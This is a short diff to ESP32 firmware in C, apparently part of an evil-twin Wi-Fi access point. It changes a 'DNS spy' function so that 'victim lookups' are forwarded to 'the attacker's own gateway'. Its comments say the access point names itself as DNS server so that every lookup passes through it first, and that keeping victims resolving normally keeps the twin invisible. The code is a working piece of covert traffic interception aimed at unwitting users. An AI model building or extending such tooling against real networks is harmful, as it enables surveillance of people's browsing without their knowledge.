@@ -35,13 +35,18 @@ void napt_relay_set_ap_dns_from_sta(esp_netif_t *ap_netif, esp_netif_t *sta_neti
 
 void napt_relay_enable_dns_spy(esp_netif_t *ap_netif, esp_netif_t *sta_netif)
 {
-    // upstream = the real uplink DNS we will forward to
-    esp_netif_dns_info_t up;
-    if (esp_netif_get_dns_info(sta_netif, ESP_NETIF_DNS_MAIN, &up) != ESP_OK) {
-        ESP_LOGW(TAG, "no uplink DNS; spy not started");
+    // Forward victim lookups to the uplink GATEWAY (the attacker's own gateway, our
+    // laptop at x.x.x.1). Public resolvers are unreachable here: Windows ICS blocks
+    // clients' outbound DNS and the phone hotspot blocks port 53, so the only
+    // resolver a victim-behind-the-twin can reach is one the gateway itself runs
+    // (gateway/dns_helper.py, bound on the gateway IP). Keeping the victim resolving
+    // normally is what makes the twin invisible (H2).
+    esp_netif_ip_info_t staip;
+    if (esp_netif_get_ip_info(sta_netif, &staip) != ESP_OK || staip.gw.addr == 0) {
+        ESP_LOGW(TAG, "no uplink gateway yet; DNS spy not started");
         return;
     }
-    uint32_t upstream = up.ip.u_addr.ip4.addr;   // network order
+    uint32_t upstream = staip.gw.addr;  // the gateway's resolver (network byte order)
 
     // advertise the AP's OWN IP (192.168.4.1) as the DNS server, so every lookup
     // comes to us first
